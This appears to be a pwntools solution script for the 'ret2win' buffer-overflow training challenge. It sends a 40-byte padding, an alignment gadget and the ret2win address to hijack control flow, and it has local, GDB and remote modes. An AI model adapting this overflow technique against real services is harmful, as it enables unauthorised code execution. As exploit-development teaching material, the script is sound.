from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x400755
continue
'''.format(**locals())

exe = './ret2win'
elf = context.binary = ELF(exe, checksec=False)
p = start()

# ===== Exploit script here =====
p.sendlineafter(b'> ', b'A'*40 + p64(0x400755) + p64(elf.sym['ret2win']))
p.interactive()